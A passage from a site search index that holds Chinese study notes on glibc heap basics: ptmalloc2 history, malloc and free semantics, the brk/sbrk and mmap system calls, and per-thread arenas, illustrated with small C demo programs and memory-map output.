\u5f53\u7528\u6237\u8bf7\u6c42\u7684\u5185\u5b58\u5927\u4e8e 128KB \u65f6\uff0c\u5e76\u4e14\u6ca1\u6709\u4efb\u4f55 arena \u6709\u8db3\u591f\u7684\u7a7a\u95f4\u65f6\uff0c\u90a3\u4e48\u7cfb\u7edf\u5c31\u4f1a\u6267\u884c mmap \u51fd\u6570\u6765\u5206\u914d\u76f8\u5e94\u7684\u5185\u5b58\u7a7a\u95f4\u3002\u8fd9\u4e0e\u8fd9\u4e2a\u8bf7\u6c42\u6765\u81ea\u4e8e\u4e3b\u7ebf\u7a0b\u8fd8\u662f\u4ece\u7ebf\u7a0b\u65e0\u5173\u3002 sploitfun@sploitfun-VirtualBox:~/ptmalloc.ppt/mthread$ ./mthread Welcome to per thread arena example::6501 Before malloc in main thread After malloc and before free in main thread After free in main thread Before malloc in thread 1 After malloc and before free in thread 1 ... sploitfun@sploitfun-VirtualBox:~/ptmalloc.ppt/mthread$ cat /proc/6501/maps 08048000-08049000 r-xp 00000000 08:01 539625 /home/sploitfun/ptmalloc.ppt/mthread/mthread 08049000-0804a000 r--p 00000000 08:01 539625 /home/sploitfun/ptmalloc.ppt/mthread/mthread 0804a000-0804b000 rw-p 00001000 08:01 539625 /home/sploitfun/ptmalloc.ppt/mthread/mthread 0804b000-0806c000 rw-p 00000000 00:00 0 [heap] b7500000-b7521000 rw-p 00000000 00:00 0 b7521000-b7600000 ---p 00000000 00:00 0 b7604000-b7605000 ---p 00000000 00:00 0 b7605000-b7e07000 rw-p 00000000 00:00 0 [stack:6594] ... sploitfun@sploitfun-VirtualBox:~/ptmalloc.ppt/mthread$ \u5728\u7b2c\u4e00\u4e2a\u7ebf\u7a0b\u91ca\u653e\u5185\u5b58\u540e \uff0c \u6211\u4eec\u53ef\u4ee5\u4ece\u4e0b\u9762\u7684\u8f93\u51fa\u770b\u5230\uff0c\u8fd9\u6837\u91ca\u653e\u5185\u5b58\u540c\u6837\u4e0d\u4f1a\u628a\u5185\u5b58\u91cd\u65b0\u7ed9\u7cfb\u7edf\u3002 sploitfun@sploitfun-VirtualBox:~/ptmalloc.ppt/mthread$ ./mthread Welcome to per thread arena example::6501 Before malloc in main thread After malloc and before free in main thread After free in main thread Before malloc in thread 1 After malloc and before free in thread 1 After free in thread 1 ... sploitfun@sploitfun-VirtualBox:~/ptmalloc.ppt/mthread$ cat /proc/6501/maps 08048000-08049000 r-xp 00000000 08:01 539625 /home/sploitfun/ptmalloc.ppt/mthread/mthread 08049000-0804a000 r--p 00000000 08:01 539625 /home/sploitfun/ptmalloc.ppt/mthread/mthread 0804a000-0804b000 rw-p 00001000 08:01 539625 /home/sploitfun/ptmalloc.ppt/mthread/mthread 0804b000-0806c000 rw-p 00000000 00:00 0 [heap] b7500000-b7521000 rw-p 00000000 00:00 0 b7521000-b7600000 ---p 00000000 00:00 0 b7604000-b7605000 ---p 00000000 00:00 0 b7605000-b7e07000 rw-p 00000000 00:00 0 [stack:6594] ... sploitfun@sploitfun-VirtualBox:~/ptmalloc.ppt/mthread$ \u53c2\u8003\u6587\u732e sploitfun","title":"\u5806\u4ecb\u7ecd"},{"location":"glibc-heap/Introduction_heap/#_1","text":"\u5185\u5bb9\u7edd\u5927\u90e8\u5206\u6765\u81eactf-wiki\uff0c\u6587\u7ae0\u7528\u4e8e\u81ea\u5df1\u5b66\u4e60\u8bb0\u5f55","title":"\u5806\u6982\u8ff0"},{"location":"glibc-heap/Introduction_heap/#_2","text":"\u5728\u7a0b\u5e8f\u8fd0\u884c\u8fc7\u7a0b\u4e2d\uff0c \u5806\u53ef\u4ee5\u63d0\u4f9b\u52a8\u6001\u5206\u914d\u7684\u5185\u5b58 \uff0c\u5141\u8bb8\u7a0b\u5e8f\u7533\u8bf7\u5927\u5c0f\u672a\u77e5\u7684\u5185\u5b58 ^1 \u3002\u5806\u5176\u5b9e\u5c31\u662f\u7a0b\u5e8f\u865a\u62df\u5730\u5740\u7a7a\u95f4\u7684\u4e00\u5757\u8fde\u7eed\u7684\u7ebf\u6027\u533a\u57df\uff0c\u5b83\u7531\u4f4e\u5730\u5740\u5411\u9ad8\u5730\u5740\u65b9\u5411\u589e\u957f\u3002\u6211\u4eec\u4e00\u822c\u79f0\u7ba1\u7406\u5806\u7684\u90a3\u90e8\u5206\u7a0b\u5e8f\u4e3a\u5806\u7ba1\u7406\u5668\u3002 \u5806\u7ba1\u7406\u5668\u5904\u4e8e\u7528\u6237\u7a0b\u5e8f\u4e0e\u5185\u6838\u4e2d\u95f4\uff0c\u4e3b\u8981\u505a\u4ee5\u4e0b\u5de5\u4f5c \u54cd\u5e94\u7528\u6237\u7684\u7533\u8bf7\u5185\u5b58\u8bf7\u6c42\uff0c\u5411\u64cd\u4f5c\u7cfb\u7edf \u7533\u8bf7\u5185\u5b58 \uff0c\u7136\u540e\u5c06\u5176\u8fd4\u56de\u7ed9\u7528\u6237\u7a0b\u5e8f\u3002\u540c\u65f6\uff0c\u4e3a\u4e86\u4fdd\u6301\u5185\u5b58\u7ba1\u7406\u7684\u9ad8\u6548\u6027\uff0c \u5185\u6838\u4e00\u822c\u90fd\u4f1a\u9884\u5148\u5206\u914d\u5f88\u5927\u7684\u4e00\u5757\u8fde\u7eed\u7684\u5185\u5b58\uff0c\u7136\u540e\u8ba9\u5806\u7ba1\u7406\u5668\u901a\u8fc7\u67d0\u79cd\u7b97\u6cd5\u7ba1\u7406\u8fd9\u5757\u5185\u5b58\u3002\u53ea\u6709\u5f53\u51fa\u73b0\u4e86\u5806\u7a7a\u95f4\u4e0d\u8db3\u7684\u60c5\u51b5\uff0c\u5806\u7ba1\u7406\u5668\u624d\u4f1a\u518d\u6b21\u4e0e\u64cd\u4f5c\u7cfb\u7edf\u8fdb\u884c\u4ea4\u4e92 \u3002 \u7ba1\u7406\u7528\u6237\u6240\u91ca\u653e\u7684\u5185\u5b58 \u3002\u4e00\u822c\u6765\u8bf4\uff0c\u7528\u6237\u91ca\u653e\u7684\u5185\u5b58\u5e76\u4e0d\u662f\u76f4\u63a5\u8fd4\u8fd8\u7ed9\u64cd\u4f5c\u7cfb\u7edf\u7684\uff0c\u800c\u662f\u7531\u5806\u7ba1\u7406\u5668\u8fdb\u884c\u7ba1\u7406\u3002\u8fd9\u4e9b\u91ca\u653e\u7684\u5185\u5b58\u53ef\u4ee5\u6765\u54cd\u5e94\u7528\u6237\u65b0\u7533\u8bf7\u7684\u5185\u5b58\u7684\u8bf7\u6c42\u3002 Linux \u4e2d\u65e9\u671f\u7684\u5806\u5206\u914d\u4e0e\u56de\u6536\u7531 Doug Lea \u5b9e\u73b0\uff0c\u4f46\u5b83\u5728\u5e76\u884c\u5904\u7406\u591a\u4e2a\u7ebf\u7a0b\u65f6\uff0c\u4f1a\u5171\u4eab\u8fdb\u7a0b\u7684\u5806\u5185\u5b58\u7a7a\u95f4\u3002\u56e0\u6b64\uff0c\u4e3a\u4e86\u5b89\u5168\u6027\uff0c\u4e00\u4e2a\u7ebf\u7a0b\u4f7f\u7528\u5806\u65f6\uff0c\u4f1a\u8fdb\u884c\u52a0\u9501\u3002\u7136\u800c\uff0c\u4e0e\u6b64\u540c\u65f6\uff0c\u52a0\u9501\u4f1a\u5bfc\u81f4\u5176\u5b83\u7ebf\u7a0b\u65e0\u6cd5\u4f7f\u7528\u5806\uff0c\u964d\u4f4e\u4e86\u5185\u5b58\u5206\u914d\u548c\u56de\u6536\u7684\u9ad8\u6548\u6027\u3002\u540c\u65f6\uff0c\u5982\u679c\u5728\u591a\u7ebf\u7a0b\u4f7f\u7528\u65f6\uff0c\u6ca1\u80fd\u6b63\u786e\u63a7\u5236\uff0c\u4e5f\u53ef\u80fd\u5f71\u54cd\u5185\u5b58\u5206\u914d\u548c\u56de\u6536\u7684\u6b63\u786e\u6027\u3002Wolfram Gloger \u5728 Doug Lea \u7684\u57fa\u7840\u4e0a\u8fdb\u884c\u6539\u8fdb\u4f7f\u5176\u53ef\u4ee5\u652f\u6301\u591a\u7ebf\u7a0b\uff0c\u8fd9\u4e2a\u5806\u5206\u914d\u5668\u5c31\u662f ptmalloc \u3002\u5728 glibc-2.3.x. \u4e4b\u540e\uff0cglibc \u4e2d\u96c6\u6210\u4e86 ptmalloc2\u3002 \u76ee\u524d Linux \u6807\u51c6\u53d1\u884c\u7248\u4e2d\u4f7f\u7528\u7684\u5806\u5206\u914d\u5668\u662f glibc \u4e2d\u7684\u5806\u5206\u914d\u5668\uff1aptmalloc2\u3002ptmalloc2 \u4e3b\u8981\u662f\u901a\u8fc7 malloc/free \u51fd\u6570\u6765\u5206\u914d\u548c\u91ca\u653e\u5185\u5b58\u5757\u3002 \u9700\u8981\u6ce8\u610f\u7684\u662f\uff0c\u5728\u5185\u5b58\u5206\u914d\u4e0e\u4f7f\u7528\u7684\u8fc7\u7a0b\u4e2d\uff0cLinux \u6709\u8fd9\u6837\u7684\u4e00\u4e2a\u57fa\u672c\u5185\u5b58\u7ba1\u7406\u601d\u60f3\uff0c \u53ea\u6709\u5f53\u771f\u6b63\u8bbf\u95ee\u4e00\u4e2a\u5730\u5740\u7684\u65f6\u5019\uff0c\u7cfb\u7edf\u624d\u4f1a\u5efa\u7acb\u865a\u62df\u9875\u9762\u4e0e\u7269\u7406\u9875\u9762\u7684\u6620\u5c04\u5173\u7cfb \u3002 \u6240\u4ee5\u867d\u7136\u64cd\u4f5c\u7cfb\u7edf\u5df2\u7ecf\u7ed9\u7a0b\u5e8f\u5206\u914d\u4e86\u5f88\u5927\u7684\u4e00\u5757\u5185\u5b58\uff0c\u4f46\u662f\u8fd9\u5757\u5185\u5b58\u5176\u5b9e\u53ea\u662f\u865a\u62df\u5185\u5b58\u3002\u53ea\u6709\u5f53\u7528\u6237\u4f7f\u7528\u5230\u76f8\u5e94\u7684\u5185\u5b58\u65f6\uff0c\u7cfb\u7edf\u624d\u4f1a\u771f\u6b63\u5206\u914d\u7269\u7406\u9875\u9762\u7ed9\u7528\u6237\u4f7f\u7528\u3002","title":"\u4ec0\u4e48\u662f\u5806"},{"location":"glibc-heap/Introduction_heap/#_3","text":"\u8fd9\u91cc\u6211\u4eec\u4e3b\u8981\u4ecb\u7ecd \u57fa\u672c\u7684\u5806\u64cd\u4f5c\uff0c\u5305\u62ec\u5806\u7684\u5206\u914d\uff0c\u56de\u6536\uff0c\u5806\u5206\u914d\u80cc\u540e\u7684\u7cfb\u7edf\u8c03\u7528 \u4ecb\u7ecd\u5806\u76ee\u524d\u7684\u591a\u7ebf\u7a0b\u652f\u6301\u3002","title":"\u5806\u7684\u57fa\u672c\u64cd\u4f5c"},{"location":"glibc-heap/Introduction_heap/#malloc","text":"\u5728 glibc \u7684 malloc.c \u4e2d\uff0cmalloc \u7684\u8bf4\u660e\u5982\u4e0b /* malloc(size_t n) Returns a pointer to a newly allocated chunk of at least n bytes, or null if no space is available. Additionally, on failure, errno is set to ENOMEM on ANSI C systems. If n is zero, malloc returns a minumum-sized chunk. (The minimum size is 16 bytes on most 32bit systems, and 24 or 32 bytes on 64bit systems.) On most systems, size_t is an unsigned type, so calls with negative arguments are interpreted as requests for huge amounts of space, which will often fail. The maximum supported value of n differs across systems, but is in all cases less than the maximum representable value of a size_t. */ \u53ef\u4ee5\u770b\u51fa\uff0cmalloc \u51fd\u6570\u8fd4\u56de\u5bf9\u5e94\u5927\u5c0f\u5b57\u8282\u7684\u5185\u5b58\u5757\u7684 \u6307\u9488 ^2 \u3002\u6b64\u5916\uff0c\u8be5\u51fd\u6570\u8fd8\u5bf9\u4e00\u4e9b\u5f02\u5e38\u60c5\u51b5\u8fdb\u884c\u4e86\u5904\u7406 \u5f53 n=0 \u65f6\uff0c\u8fd4\u56de\u5f53\u524d\u7cfb\u7edf\u5141\u8bb8\u7684\u5806\u7684\u6700\u5c0f\u5185\u5b58\u5757\u3002 \u5f53 n \u4e3a\u8d1f\u6570\u65f6\uff0c\u7531\u4e8e\u5728\u5927\u591a\u6570\u7cfb\u7edf\u4e0a\uff0c size_t \u662f \u65e0\u7b26\u53f7\u6570 \uff08\u8fd9\u4e00\u70b9\u975e\u5e38\u91cd\u8981\uff09 \uff0c\u6240\u4ee5\u7a0b\u5e8f\u5c31\u4f1a\u7533\u8bf7\u5f88\u5927\u7684\u5185\u5b58\u7a7a\u95f4\uff0c\u4f46\u901a\u5e38\u6765\u8bf4\u90fd\u4f1a\u5931\u8d25\uff0c\u56e0\u4e3a\u7cfb\u7edf\u6ca1\u6709\u90a3\u4e48\u591a\u7684\u5185\u5b58\u53ef\u4ee5\u5206\u914d\u3002","title":"malloc"},{"location":"glibc-heap/Introduction_heap/#free","text":"\u5728 glibc \u7684 malloc.c \u4e2d\uff0cfree \u7684\u8bf4\u660e\u5982\u4e0b /* free(void* p) Releases the chunk of memory pointed to by p, that had been previously allocated using malloc or a related routine such as realloc. It has no effect if p is null. It can have arbitrary (i.e., bad!) effects if p has already been freed. Unless disabled (using mallopt), freeing very large spaces will when possible, automatically trigger operations that give back unused memory to the system, thus reducing program footprint. */ \u53ef\u4ee5\u770b\u51fa\uff0cfree \u51fd\u6570\u4f1a\u91ca\u653e\u7531 p \u6240\u6307\u5411\u7684\u5185\u5b58\u5757\u3002\u8fd9\u4e2a\u5185\u5b58\u5757\u6709\u53ef\u80fd\u662f\u901a\u8fc7 malloc \u51fd\u6570\u5f97\u5230\u7684\uff0c\u4e5f\u6709\u53ef\u80fd\u662f\u901a\u8fc7\u76f8\u5173\u7684\u51fd\u6570 realloc \u5f97\u5230\u7684\u3002 \u6b64\u5916\uff0c\u8be5\u51fd\u6570\u4e5f\u540c\u6837\u5bf9\u5f02\u5e38\u60c5\u51b5\u8fdb\u884c\u4e86\u5904\u7406 \u5f53 p \u4e3a\u7a7a\u6307\u9488\u65f6\uff0c\u51fd\u6570\u4e0d\u6267\u884c\u4efb\u4f55\u64cd\u4f5c\u3002 \u5f53 p \u5df2\u7ecf\u88ab\u91ca\u653e\u4e4b\u540e\uff0c\u518d\u6b21\u91ca\u653e\u4f1a\u51fa\u73b0\u4e71\u4e03\u516b\u7cdf\u7684\u6548\u679c\uff0c\u8fd9\u5176\u5b9e\u5c31\u662f double free \u3002 \u9664\u4e86\u88ab\u7981\u7528 (mallopt) \u7684\u60c5\u51b5\u4e0b\uff0c\u5f53\u91ca\u653e\u5f88\u5927\u7684\u5185\u5b58\u7a7a\u95f4\u65f6\uff0c\u7a0b\u5e8f\u4f1a\u5c06\u8fd9\u4e9b\u5185\u5b58\u7a7a\u95f4\u8fd8\u7ed9\u7cfb\u7edf\uff0c\u4ee5\u4fbf\u4e8e\u51cf\u5c0f\u7a0b\u5e8f\u6240\u4f7f\u7528\u7684\u5185\u5b58\u7a7a\u95f4\u3002 ^3","title":"free"},{"location":"glibc-heap/Introduction_heap/#_4","text":"\u5728\u524d\u9762\u63d0\u5230\u7684\u51fd\u6570\u4e2d\uff0c\u65e0\u8bba\u662f malloc \u51fd\u6570\u8fd8\u662f free \u51fd\u6570\uff0c\u6211\u4eec\u52a8\u6001\u7533\u8bf7\u548c\u91ca\u653e\u5185\u5b58\u65f6\uff0c\u90fd\u7ecf\u5e38\u4f1a\u4f7f\u7528\uff0c\u4f46\u662f\u5b83\u4eec\u5e76\u4e0d\u662f\u771f\u6b63\u4e0e\u7cfb\u7edf\u4ea4\u4e92\u7684\u51fd\u6570\u3002\u8fd9\u4e9b\u51fd\u6570\u80cc\u540e\u7684\u7cfb\u7edf\u8c03\u7528\u4e3b\u8981\u662f (s)brk \u51fd\u6570\u4ee5\u53ca mmap, munmap \u51fd\u6570\u3002[^4] [^4]:\u4e5f\u5c31\u662f\u76f8\u5f53\u4e8e malloc \u662f\u4e00\u4e2a\u6574\u5408\u5305\uff0c\u6253\u5305\u597d\u5b9e\u73b0\u7533\u8bf7\u5806\u5757\u9700\u8981\u7528\u5230\u7684\u6240\u6709\u51fd\u6570\u3002\u7c7b\u4f3c\u7684\u51fd\u6570\u8fd8\u6709 system \u7b49 \u5982\u4e0b\u56fe\u6240\u793a\uff0c\u6211\u4eec\u4e3b\u8981\u8003\u8651\u5bf9\u5806\u8fdb\u884c\u7533\u8bf7\u5185\u5b58\u5757\u7684\u64cd\u4f5c\u3002","title":"\u5185\u5b58\u5206\u914d\u80cc\u540e\u7684\u7cfb\u7edf\u8c03\u7528"},{"location":"glibc-heap/Introduction_heap/#sbrk","text":"\u5bf9\u4e8e\u5806\u7684\u64cd\u4f5c\uff0c\u64cd\u4f5c\u7cfb\u7edf\u63d0\u4f9b\u4e86 brk \u51fd\u6570\uff0cglibc \u5e93\u63d0\u4f9b\u4e86 sbrk \u51fd\u6570\uff0c\u6211\u4eec\u53ef\u4ee5\u901a\u8fc7\u589e\u52a0 brk \u7684\u5927\u5c0f\u6765\u5411\u64cd\u4f5c\u7cfb\u7edf\u7533\u8bf7\u5185\u5b58\u3002 \u521d\u59cb\u65f6\uff0c\u5806\u7684\u8d77\u59cb\u5730\u5740 start_brk \u4ee5\u53ca\u5806\u7684\u5f53\u524d\u672b\u5c3e brk \u6307\u5411\u540c\u4e00\u5730\u5740\u3002\u6839\u636e\u662f\u5426\u5f00\u542f ASLR\uff0c\u4e24\u8005\u7684\u5177\u4f53\u4f4d\u7f6e\u4f1a\u6709\u6240\u4e0d\u540c \u4e0d\u5f00\u542f ASLR \u4fdd\u62a4\u65f6\uff0cstart_brk \u4ee5\u53ca brk \u4f1a\u6307\u5411 data/bss \u6bb5\u7684\u7ed3\u5c3e\u3002 \u5f00\u542f ASLR \u4fdd\u62a4\u65f6\uff0cstart_brk \u4ee5\u53ca brk \u4e5f\u4f1a\u6307\u5411\u540c\u4e00\u4f4d\u7f6e\uff0c\u53ea\u662f\u8fd9\u4e2a\u4f4d\u7f6e\u662f\u5728 data/bss \u6bb5\u7ed3\u5c3e\u540e\u7684\u968f\u673a\u504f\u79fb\u5904\u3002 \u5177\u4f53\u6548\u679c\u5982\u4e0b\u56fe\uff08\u8fd9\u4e2a\u56fe\u7247\u4e0e\u7f51\u4e0a\u6d41\u4f20\u7684\u57fa\u672c\u4e00\u81f4\uff0c\u8fd9\u91cc\u662f\u56e0\u4e3a\u8981\u753b\u4e00\u5f20\u5927\u56fe\uff0c\u6240\u4ee5\u81ea\u5df1\u5355\u72ec\u753b\u4e86\u4e0b\uff09\u6240\u793a \u4f8b\u5b50 /* sbrk and brk example */ #include <stdio.h> #include <unistd.h> #include <sys/types.h> int main() { void *curr_brk, *tmp_brk = NULL; printf(\"Welcome to sbrk example:%d\\n\", getpid()); /* sbrk(0) gives current program break location */ tmp_brk = curr_brk = sbrk(0); printf(\"Program Break Location1:%p\\n\", curr_brk); getchar(); /* brk(addr) increments/decrements program break location */ brk(curr_brk+4096); curr_brk = sbrk(0); printf(\"Program break Location2:%p\\n\", curr_brk); getchar(); brk(tmp_brk); curr_brk = sbrk(0); printf(\"Program Break Location3:%p\\n\", curr_brk); getchar(); return 0; } //gcc sbrk_brk_example.c -m32 -o ./sbrk_brk_example \u9700\u8981\u6ce8\u610f\u7684\u662f\uff0c\u5728\u6bcf\u4e00\u6b21\u6267\u884c\u5b8c\u64cd\u4f5c\u540e\uff0c\u90fd\u6267\u884c\u4e86 getchar() \u51fd\u6570\uff0c\u8fd9\u662f\u4e3a\u4e86\u6211\u4eec\u65b9\u4fbf\u6211\u4eec\u67e5\u770b\u7a0b\u5e8f\u771f\u6b63\u7684\u6620\u5c04\u3002 \u5728\u7b2c\u4e00\u6b21\u8c03\u7528 brk \u4e4b\u524d \u4ece\u4e0b\u9762\u7684\u8f93\u51fa\u53ef\u4ee5\u770b\u51fa\uff0c\u5e76\u6ca1\u6709\u51fa\u73b0\u5806\u3002\u56e0\u6b64 start_brk = brk = end_data = 0x806c000 \u7b2c\u4e00\u6b21\u589e\u52a0 brk \u540e \u4ece\u4e0b\u9762\u7684\u8f93\u51fa\u53ef\u4ee5\u770b\u51fa\uff0c\u5df2\u7ecf\u51fa\u73b0\u4e86\u5806\u6bb5 start_brk = end_data = 0x806c000 brk = 0x806d000 \u5176\u4e2d\uff0c\u5173\u4e8e\u5806\u7684\u90a3\u4e00\u884c 0x806c000\u662f\u76f8\u5e94\u5806\u7684\u8d77\u59cb\u5730\u5740 rw-p \u8868\u660e\u5806\u5177\u6709\u53ef\u8bfb\u53ef\u5199\u6743\u9650\uff0c\u5e76\u4e14\u5c5e\u4e8e\u9690\u79c1\u6570\u636e\u3002 00000000 \u8868\u660e\u6587\u4ef6\u504f\u79fb\uff0c\u7531\u4e8e\u8fd9\u90e8\u5206\u5185\u5bb9\u5e76\u4e0d\u662f\u4ece\u6587\u4ef6\u4e2d\u6620\u5c04\u5f97\u5230\u7684\uff0c\u6240\u4ee5\u4e3a 0\u3002 00:00 \u662f\u4e3b\u4ece (Major/mirror) \u7684\u8bbe\u5907\u53f7\uff0c\u8fd9\u90e8\u5206\u5185\u5bb9\u4e5f\u4e0d\u662f\u4ece\u6587\u4ef6\u4e2d\u6620\u5c04\u5f97\u5230\u7684\uff0c\u6240\u4ee5\u4e5f\u90fd\u4e3a 0\u3002 0 \u8868\u793a\u7740 Inode \u53f7\u3002\u7531\u4e8e\u8fd9\u90e8\u5206\u5185\u5bb9\u5e76\u4e0d\u662f\u4ece\u6587\u4ef6\u4e2d\u6620\u5c04\u5f97\u5230\u7684\uff0c\u6240\u4ee5\u4e3a 0\u3002 \u7136\u540e\u901a\u8fc7 brk(tmp_brk); \u5c06\u6307\u9488\u5f52\u4f4d\u56de\u5230 0x806c000 \uff0c\u65b0\u51fa\u73b0\u7684 heap \u6d88\u5931\u3002\u5177\u4f53\u548c\u7b2c\u4e00\u6b65\u56fe\u4e00\u6837\uff0c\u4e0d\u8d34\u56fe\u4e86\u3002","title":"(s)brk"},{"location":"glibc-heap/Introduction_heap/#mmap","text":"malloc \u4f1a\u4f7f\u7528 mmap \u6765\u521b\u5efa\u72ec\u7acb\u7684\u533f\u540d\u6620\u5c04\u6bb5\u3002\u533f\u540d\u6620\u5c04\u7684\u76ee\u7684\u4e3b\u8981\u662f\u53ef\u4ee5\u7533\u8bf7\u4ee5 0 \u586b\u5145\u7684\u5185\u5b58\uff0c\u5e76\u4e14\u8fd9\u5757\u5185\u5b58\u4ec5\u88ab\u8c03\u7528\u8fdb\u7a0b\u6240\u4f7f\u7528\u3002 \u4f8b\u5b50 /* Private anonymous mapping example using mmap syscall */ #include <stdio.h> #include <sys/mman.h> #include <sys/types.h> #include <sys/stat.h> #include <fcntl.h> #include <unistd.h> #include <stdlib.h> void static inline errExit(const char* msg) { printf(\"%s failed. Exiting the process\\n\", msg); exit(-1); } int main() { int ret = -1; printf(\"Welcome to private anonymous mapping example::PID:%d\\n\", getpid()); printf(\"Before mmap\\n\"); getchar(); char* addr = NULL; addr = mmap(NULL, (size_t)132*1024, PROT_READ|PROT_WRITE, MAP_PRIVATE | MAP_ANONYMOUS, -1, 0); if (addr == MAP_FAILED) errExit(\"mmap\"); printf(\"After mmap\\n\"); getchar(); /* Unmap mapped region. */ ret = munmap(addr, (size_t)132*1024); if(ret == -1) errExit(\"munmap\"); printf(\"After munmap\\n\"); getchar(); return 0; } \u5728\u6267\u884c mmap \u4e4b\u524d \u6211\u4eec\u53ef\u4ee5\u4ece\u4e0b\u9762\u7684\u8f93\u51fa\u770b\u5230\uff0c\u76ee\u524d\u53ea\u6709. so \u6587\u4ef6\u7684 mmap \u6bb5\u3002 sploitfun@sploitfun-VirtualBox:~/ptmalloc.ppt/syscalls$ cat /proc/6067/maps 08048000-08049000 r-xp 00000000 08:01 539691 /home/sploitfun/ptmalloc.ppt/syscalls/mmap 08049000-0804a000 r--p 00000000 08:01 539691 /home/sploitfun/ptmalloc.ppt/syscalls/mmap 0804a000-0804b000 rw-p 00001000 08:01 539691 /home/sploitfun/ptmalloc.ppt/syscalls/mmap b7e21000-b7e22000 rw-p 00000000 00:00 0 ... sploitfun@sploitfun-VirtualBox:~/ptmalloc.ppt/syscalls$ mmap \u540e \u4ece\u4e0b\u9762\u7684\u8f93\u51fa\u53ef\u4ee5\u770b\u51fa\uff0c\u6211\u4eec\u7533\u8bf7\u7684\u5185\u5b58\u4e0e\u5df2\u7ecf\u5b58\u5728\u7684\u5185\u5b58\u6bb5\u7ed3\u5408\u5728\u4e86\u4e00\u8d77\u6784\u6210\u4e86 b7e00000 \u5230 b7e21000 \u7684 mmap \u6bb5\u3002 sploitfun@sploitfun-VirtualBox:~/ptmalloc.ppt/syscalls$ cat /proc/6067/maps 08048000-08049000 r-xp 00000000 08:01 539691 /home/sploitfun/ptmalloc.ppt/syscalls/mmap 08049000-0804a000 r--p 00000000 08:01 539691 /home/sploitfun/ptmalloc.ppt/syscalls/mmap 0804a000-0804b000 rw-p 00001000 08:01 539691 /home/sploitfun/ptmalloc.ppt/syscalls/mmap b7e00000-b7e22000 rw-p 00000000 00:00 0 ... sploitfun@sploitfun-VirtualBox:~/ptmalloc.ppt/syscalls$ munmap \u4ece\u4e0b\u9762\u7684\u8f93\u51fa\uff0c\u6211\u4eec\u53ef\u4ee5\u770b\u5230\u6211\u4eec\u539f\u6765\u7533\u8bf7\u7684\u5185\u5b58\u6bb5\u5df2\u7ecf\u6ca1\u6709\u4e86\uff0c\u5185\u5b58\u6bb5\u53c8\u6062\u590d\u4e86\u539f\u6765\u7684\u6837\u5b50\u4e86\u3002 sploitfun@sploitfun-VirtualBox:~/ptmalloc.ppt/syscalls$ cat /proc/6067/maps 08048000-08049000 r-xp 00000000 08:01 539691 /home/sploitfun/ptmalloc.ppt/syscalls/mmap 08049000-0804a000 r--p 00000000 08:01 539691 /home/sploitfun/ptmalloc.ppt/syscalls/mmap 0804a000-0804b000 rw-p 00001000 08:01 539691 /home/sploitfun/ptmalloc.ppt/syscalls/mmap b7e21000-b7e22000 rw-p 00000000 00:00 0 ... sploitfun@sploitfun-VirtualBox:~/ptmalloc.ppt/syscalls$","title":"mmap"},{"location":"glibc-heap/Introduction_heap/#_5","text":"\u5728\u539f\u6765\u7684 dlmalloc \u5b9e\u73b0\u4e2d\uff0c\u5f53\u4e24\u4e2a\u7ebf\u7a0b\u540c\u65f6\u8981\u7533\u8bf7\u5185\u5b58\u65f6\uff0c\u53ea\u6709\u4e00\u4e2a\u7ebf\u7a0b\u53ef\u4ee5\u8fdb\u5165\u4e34\u754c\u533a\u7533\u8bf7\u5185\u5b58\uff0c\u800c\u53e6\u5916\u4e00\u4e2a\u7ebf\u7a0b\u5219\u5fc5\u987b\u7b49\u5f85\u76f4\u5230\u4e34\u754c\u533a\u4e2d\u4e0d\u518d\u6709\u7ebf\u7a0b\u3002\u8fd9\u662f\u56e0\u4e3a\u6240\u6709\u7684\u7ebf\u7a0b\u5171\u4eab\u4e00\u4e2a\u5806\u3002\u5728 glibc \u7684 ptmalloc \u5b9e\u73b0\u4e2d\uff0c\u6bd4\u8f83\u597d\u7684\u4e00\u70b9\u5c31\u662f\u652f\u6301\u4e86\u591a\u7ebf\u7a0b\u7684\u5feb\u901f\u8bbf\u95ee\u3002\u5728\u65b0\u7684\u5b9e\u73b0\u4e2d\uff0c\u6240\u6709\u7684\u7ebf\u7a0b\u5171\u4eab\u591a\u4e2a\u5806\u3002 \u8fd9\u91cc\u7ed9\u51fa\u4e00\u4e2a\u4f8b\u5b50\u3002 /* Per thread arena example. */ #include <stdio.h> #include <stdlib.h> #include <pthread.h> #include <unistd.h> #include <sys/types.h> void* threadFunc(void* arg) { printf(\"Before malloc in thread 1\\n\"); getchar(); char* addr = (char*) malloc(1000); printf(\"After malloc and before free in thread 1\\n\"); getchar(); free(addr); printf(\"After free in thread 1\\n\"); getchar(); } int main() { pthread_t t1; void* s; int ret; char* addr; printf(\"Welcome to per thread arena example::%d\\n\",getpid()); printf(\"Before malloc in main thread\\n\"); getchar(); addr = (char*) malloc(1000); printf(\"After malloc and before free in main thread\\n\"); getchar(); free(addr); printf(\"After free in main thread\\n\"); getchar(); ret = pthread_create(&t1, NULL, threadFunc, NULL); if(ret) { printf(\"Thread creation error\\n\"); return -1; } ret = pthread_join(t1, &s); if(ret) { printf(\"Thread join error\\n\"); return -1; } return 0; } \u7b2c\u4e00\u6b21\u7533\u8bf7\u4e4b\u524d \uff0c \u6ca1\u6709\u4efb\u4f55\u4efb\u4f55\u5806\u6bb5\u3002 sploitfun@sploitfun-VirtualBox:~/ptmalloc.ppt/mthread$ ./mthread Welcome to per thread arena example::6501 Before malloc in main thread ... sploitfun@sploitfun-VirtualBox:~/ptmalloc.ppt/mthread$ cat /proc/6501/maps 08048000-08049000 r-xp 00000000 08:01 539625 /home/sploitfun/ptmalloc.ppt/mthread/mthread 08049000-0804a000 r--p 00000000 08:01 539625 /home/sploitfun/ptmalloc.ppt/mthread/mthread 0804a000-0804b000 rw-p 00001000 08:01 539625 /home/sploitfun/ptmalloc.ppt/mthread/mthread b7e05000-b7e07000 rw-p 00000000 00:00 0 ... sploitfun@sploitfun-VirtualBox:~/ptmalloc.ppt/mthread$ \u7b2c\u4e00\u6b21\u7533\u8bf7\u540e \uff0c \u4ece\u4e0b\u9762\u7684\u8f93\u51fa\u53ef\u4ee5\u770b\u51fa\uff0c\u5806\u6bb5\u88ab\u5efa\u7acb\u4e86\uff0c\u5e76\u4e14\u5b83\u5c31\u7d27\u90bb\u7740\u6570\u636e\u6bb5\uff0c\u8fd9\u8bf4\u660e malloc \u7684\u80cc\u540e\u662f\u7528 brk \u51fd\u6570\u6765\u5b9e\u73b0\u7684\u3002\u540c\u65f6\uff0c\u9700\u8981\u6ce8\u610f\u7684\u662f\uff0c\u6211\u4eec\u867d\u7136\u53ea\u662f\u7533\u8bf7\u4e86 1000 